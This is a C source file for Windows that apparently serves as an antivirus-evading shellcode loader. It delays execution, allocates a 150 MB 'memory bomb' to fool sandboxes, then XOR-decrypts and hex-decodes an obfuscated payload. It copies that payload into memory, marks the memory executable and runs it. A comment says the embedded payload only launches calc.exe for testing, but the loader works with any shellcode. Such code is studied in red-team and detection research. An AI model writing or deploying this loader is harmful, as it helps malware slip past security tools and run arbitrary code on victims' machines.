#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include "shellcodefuncs.h"

#define memBomb 150000000
#define MAGIC_BYTE_A 0xf1

int main() {

    Sleep(7500);
    BYTE *junk_mem = (BYTE *)malloc(memBomb);

    if (junk_mem){

        // windows/x64/exec runs calc.exe testing purpose. 

        unsigned char encrypted_txt[] = {'|','I','a','E','S','K','\x5C','T','{','P','K','m','I','f','S','C','B','P','B','k','U','L','|','Y','b','U','R','R','U','A','y','E','H','}','K','s','U','W','J','E','E','{','T','Y','}','L','e','E','S','K','\x5C','T','{','Q','A','m','I','g',']','C','B','Q','L','k','U','M','u','Y','c','Q','[','R','U','@','s','E','I','y','A','s','U','V','@','E','D','\x7F','\x5C','Y','}','L','\x60','E','S','F','\x5C','T','{','P','K','m','I','g','\x5C','C','B','P','G','k','U','M','u','Y','c','P','P','R','U','A','{','E','I','x','J','s','U','W','K','E','D','\x7E','V','Y','}','L','g','E','S','G','W','T','{','P','O','m','I','f','T','C','B','Q','M','k','T','I','}','Y','c','P','S','R','U','A','\x7F','E','I','x','J','s','U','V','@','E','D','\x7E','S','Y','}','L','e','E','S','K',']','T','{','P','J','m','I','f','U','C','B','P','@','k','U','M','u','Y','c','P','Q','R','U','A','}','E','I','x','O','s','U','Z','J','E','D','\x7E','V','Y','}','L','c','E','S','F','\x5C','T','{','P','O','m','I','f','W','C','B','P','B','k','U','L','{','Y','c','\x5C','[','R','U','A','x','E','I','x','I','s','U','V','B','E','D','\x7F',']','Y','}','L','a','E','S','G','S','T','{','P','O','m','I','j',']','C','B','P','A','k','U','L','}','Y','c','P','P','R','U','@','s','E','I','x','K','s','U','V','D','E','D','\x7F',']','Y','|','I','a','E','S','K',']','T','{','P','L','m','I','f','W','C','B','\x5C','C','k','U','L','\x7F','Y','c','\x5C','T','R','U','A','y','E','H','}','I','s','U','V','C','E','D','\x7F','\x5C','Y','}','@','j','E','S','G','R','T','{','P','K','m','I','f','S','C','B','P','E','k','U','M','t','Y','c','\x5C','Z','R','U','@','s','E','I','t','N','s','U','Z','K','E','D','\x7E','T','Y','}','@','j','E','S','G','Q','T','{','Q','@','m','I','f','P','C','B','\x5C','M','k','U','M','u','Y','c','P','S','R','U','A','{','E','I','t','@','s','U','V','B','E','D','\x7F',']','Y','}','L','a','E','S','F','\x5C','T','{','\x5C','@','m','I','g','\x5C','C','B','\x5C','M','k','U','L','z','Y','c','Q','[','R','T','D','{','E','I','x','K','s','U','W','K','E','D','\x7F',']','Y','}','M','j','E','S','K','\x5C','T','{','Q','@','m','H','c','T','C','B','P','D','k','T','I','|','Y','b','U','S','R','U','A','x','E','I','x','I','s','U','V','@','E','D','\x7F','\x5C','Y','}','L','\x60','E','S','F','\x5C','T','{','P','K','m','I','f','S','C','B','P','B','k','U','@','u','Y','c','P','P','R','U','A','{','E','I','x','I','s','U','W','J','E','D','\x7E','S','Y','}','@','k','E','S','G','W','T','{','P','I','m','I','f','T','C','B','\x5C','M','k','U','L','\x7F','Y','c','P','U','R','U','@','s','E','I','y','@','s','T','S','B','E','D','\x7F',']','Y','}','L','e','E','S','K',']','T','{','P','O','m','I','g',']','C','B','P','B','k','U','L','{','Y','c','Q','[','R','U','@','s','E','I','y','A','s','U','W','J','E','D','\x7F',']','Y','}','M','k','E','S','G','W','T','{','P','O','m','I','f','S','C','B','P','G','k','U','@','t','Y','c','Q','[','R','U','A','\x7E','E','I','x','K','s','U','V','F','E','D','\x7E','P','Y','}','L','a','E','S','G','S','T','{','Q','A','m','I','g','\x5C','C','C','U','D','k','U','M','u','Y','c','P','P','R','U','@','s','E','I','x','O','s','U','Z','J','E','D','\x7E','W','Y','}','L','e','E','S','F','\x5C','T','{','P','O','m','I','f','W','C','B','P','F','k','U','L','{','Y','c','\x5C','[','R','U','A','y','E','I','y','A','s','U','V','B','E','D','\x7F',']','Y','}','L','a','E','S','G','R','T','{','Q','A','m','I','g','\x5C','C','C','U','D','k','U','M','u','Y','b','U','R','R','U','A','z','E','I','x','J','s','U','V','F','E','D','\x7E','W','Y','}','L','e','E','R','B','W','T','z','U','K','m','I','j','\x5C','C','B','P','C','k','U','L','\x7F','Y','c','Q','Z','R','U','A','}','E','I','t','A','s','U','V','C','E','D','\x7E','W','Y','}','L','e','E','S','G','S','T','{','P','K','m','I','f','S','C','B','Q','L','k','U','M','t','Y','b','U','S','R','U','A','\x7F','E','I','x','K','s','T','S','B','E','D','\x7E','T','Y','}','M','j','E','S','K','\x5C','T','{','P','N','m','I','f','W','C','B','P','B','k','U','L','|','Y','c','Q','Z','R','U','M','r','E','I','y','A','s','U','Z','E','E','D','r','\x5C','Y','}','L','a','E','S','F','\x5C','T','{','\x5C','@','m','I','g','\x5C','C','B','\x5C','M','k','U','L','z','Y','c','Q','[','R','T','D','{','E','I','x','K','s','U','W','K','E','D','\x7F',']','Y','}','M','j','E','S','K','\x5C','T','{','Q','@','m','I','f','T','C','B','P','B','k','T','I','|','Y','c','Q','[','R','U','A','\x7E','E','I','x','J','s','T','S','@','E','D','\x7F','\x5C','Y','}','L','a','E','S','K','\x5C','T','{','Q','A','m','I','f','T','C','B','P','F','k','U','@','t','Y','c','P','S','R','U','A','y','E','I','y','A','s','U','V','D','E','D','\x7E','W','Y','}','L','\x60','E','S','G','T','T','{','P','N','m','H','c','U','C','B','Q','M','k','U','L','x','Y','c','P','P','R','T','D','{','E','I','x','O','s','U','V','A','E','D','\x7E','S','Y','}','L','a','E','S','G','W','T','{','P','O','m','I','j',']','C','B','P','F','k','U','M','u','Y','c','P','S','R','U','A','y','E','I','x','K','s','U','V','E','E','D','\x7F',']','Y','}','M','j','E','R','B','U','T','{','Q','A','m','I','f','Q','C','B','P','@','k','U','L','\x7F','Y','c','Q','Z','R','U','A','}','E','I','t','A','s','U','W','J','E','D','r','\x5C','Y','}','L','a','E','S','G','S','T','{','P','K','m','I','f','W','C','B','P','B','k','U','@','u','Y','c','P','Q','R','U','@','s','E','I','y','@','s','U','Z','K','E','D','\x7E','W','Y','}','L','d','E','S','F',']','T','{','Q','@','m','H','c','U','C','B','Q','L','k','U','L','\x7F','Y','c','Q','Z','R','U','A','}','E','I','t','A','s','U','W','J','E','D','\x7E','W','Y','}','L','e','E','S','G','S','T','{','P','K','m','I','f','S','C','B','Q','L','k','U','M','t','Y','b','U','S','R','U','@','s','E','I','x','K','s','U','W','K','E','D','\x7E','V','Y','}','L','e','E','S','G','W','T','{','Q','@','m','I','f','V','C','B','P','B','k','U','L','\x7E','Y','b','U','R','R','U','A','x','E','I','x','N','s','U','V','A','E','D','r','R','Y','}','L','a','E','S','F','\x5C','T','{','P','J','m','I','f','S','C','B','P','F','k','U','M','t','Y','c','P','P','R','U','A','|','E','I','x','K','s','U','W','K','E','D','\x7E','V','Y','}','@','d','E',
        'S','G','W','T','{','P','O','m','I','f','S','C','B','P','E','k','T','I','|','Y','c','\x5C','Z','R','U','A','{','E','I','y','A','s','U','V','@','E','D','\x7F','\x5C','Y','}','L','\x60','E','S','G','U','T','z','U','K','m','H','c','W','C','C','U','E','k','U','M','u','Y','c','P','P','R','U','A','}','E','I','x','K','s','U','W','K','E','D','\x7E','V','Y','}','L','d','E','S','G','V','T','{','\x5C','N','m','I','f','W','C','B','P','B','k','U','L','{','Y','c','\x5C','[','R','U','@','r','E','I','x','I','s','T','S','C','E','D','\x7E','R','Y','}','L','\x60','E','S','G','P','T','z','U','K','m','H','c','W','C','C','U','F','k','T','I','\x7F','Y','b','U','Q','R','T','D','y','E','I','x','J','s','T','S','B','E','D','\x7E','W','Y','}','L','e','E','S','K',']','T','{','\x5C','N','m','I','g',']','C','B','Q','M','k','U','M','u','Y','c','Q','[','R','U','@','s','E','I','y','A','s','U','W','J','E','D','\x7F',']','Y','}','M','k','E','S','F',']','T','{','Q','A','m','I','g',']','C','B','Q','L','k','U','M','u','Y','c','Q','[','R','U','@','s','E','I','x','K','s','U','V','D','E','D','\x7E','S','Y','|','I','c','E','S','G','S','T','z','U','I','m','I','g',']','C','B','Q','M','k','U','M','u','Y','c','Q','Z','R','U','@','s','E','I','y','A','s','U','W','J','E','D','\x7F',']','Y','}','L','a','E','S','F','\x5C','T','{','\x5C','A','m','I','j','R','C','B','P','E','k','U','M','t','Y','c','P','U','R','U','M','s','E','I','x','M','s','T','S','@','E','D','\x7E','S','Y','}','L','f','E','R','B','W','T','z','U','K','m','H','c','U','C','B','P','G','k','U','@','u','Y','c','\x5C','[','R','T','D','y','E','I','y','A','s','U','Z','J','E','D','\x7E','V','Y','}','@','d','E','S','G','U','T','{','P','J','m','I','f','Q','C','B','P','F','k','U','M','t','Y','c','\x5C','[','R','U','M','|','E','I','t','N','s','U','V','F','E','D','\x7E','R','Y','}','L','\x60','E','S','K',']','T','z','U','I','m','I','f','R','C','C','U','D','k','T','I','\x7F','Y','b','U','Q','R','T','D','{','E','I','x','J','s','U','V','@','E','D','\x7E','S','Y','}','L','e','E','S','G','T','T','{','\x5C','@','m','I','f','W','C','B','P','D','k','U','L','{','Y','c','P','R','R','U','M','r','E','I','y','A','s','U','V','F','E','D','\x7E','P','Y','}','@','j','E','S','F',']','T','{','\x5C','N','m','I','f','S','C','B','Q','L','k','T','I','\x7F','Y','c','\x5C','[','R','T','D','z','E','I','y','A','s','U','V','G','E','D','\x7E','V','Y','}','M','k','E','S','G','V','T','{','\x5C','A','m','I','j',']','C','B','P','F','k','U','L','x','Y','c','Q','Z','R','U','A','z','E','I','x','L','s','U','V','B','E','D','\x7E','Q','Y','|','I','a','E','S','G','Q','T','{','\x5C','N','m','I','g',']','C','B','Q','L','k','U','L','\x7E','Y','c','P','T','R','U','A','y','E','I','y','@','s','U','V','D','E','D','\x7E','R','Y','|','I','c','E','S','K','R','T','z','U','K','m','H','c','W','C','C','U','D','k','U','L','\x7E','Y','c','P','W','R','U','A','z','E','I','x','M','s','U','W','K','E','D','\x7E','Q','Y','}','@','j','E','S','G','Q','T','{','P','H','m','I','f','U','C','C','U','E','k','U','L','y','Y','c','P','P','R','U','A','\x7E','E','I','x','O','s','U','V','F','E','D','\x7E','V','Y','}','M','k','E','S','F',']','T'};
        
        memset(junk_mem, MAGIC_BYTE_A, memBomb);
        free(junk_mem);

        char xor_key[] = "MySecretKey";
        unsigned int encrypted_txt_size = strlen((const char*)encrypted_txt);
        unsigned int key_length = strlen((const char*)xor_key);    
        unsigned int char_in_hex;

        xor_decrypt(encrypted_txt, encrypted_txt_size, xor_key, key_length);
        
        unsigned char *shellcode = ascii_decode((const char *)encrypted_txt, encrypted_txt_size);
        unsigned int shellcode_size = strlen((const char*)shellcode);
        unsigned int memory_allocation = shellcode_size / 2;
   
        for(unsigned int i = 0; i< shellcode_size-1; i++) {
    
            sscanf((const char *)shellcode+2*i, "%2X", &char_in_hex);
            shellcode[i] = (char)char_in_hex;
    
        }

        void *exec = VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        memcpy(exec, shellcode, memory_allocation);
        free(shellcode);

        DWORD ignore;
        VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
        (*(void (*)()) exec)();
    
    }
    
    return 0;

}